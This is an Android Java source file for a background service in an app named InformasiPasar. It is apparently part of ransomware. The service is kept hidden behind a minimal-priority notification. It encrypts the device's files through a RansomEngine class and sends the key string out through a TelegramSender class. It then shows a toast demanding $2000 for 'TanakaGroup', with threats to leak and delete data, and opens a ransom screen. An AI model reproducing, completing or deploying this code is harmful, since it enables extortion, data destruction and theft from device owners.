package com.informasipasar.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

public class BackgroundService extends Service {

    private static final String TAG = "BackgroundService";
    private static final String CHANNEL_ID = "bg_channel";

    private byte[] key;
    private String keyString;

    @Override
    public void onCreate() {
        super.onCreate();
        createChannel();
        startForeground(1, buildNotification());
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    CHANNEL_ID, "Background", NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("InformasiPasar")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setOngoing(true)
                .build();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (key == null) {
            key = RansomEngine.generateKey();
            keyString = RansomEngine.randomKeyString();
            new Thread(() -> {
                RansomEngine.encryptAll(key, k -> {
                    TelegramSender.sendKey(keyString);
                    notifyEncrypted();
                    stopSelf();
                });
            }).start();
        }
        return START_STICKY;
    }

    private void notifyEncrypted() {
        // Toast muncul sekali saat semua file terenkripsi
        new android.os.Handler(getMainLooper()).post(() -> {
            android.widget.Toast.makeText(
                    getApplicationContext(),
                    "Your devices now is Locked by TanakaGroup, pls pay the key with $2000 now!! or your data we share and permanent deleted",
                    android.widget.Toast.LENGTH_LONG).show();
        });
        // Ganti layar jadi ransom note
        Intent i = new Intent(this, RansomActivity.class);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
        startActivity(i);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
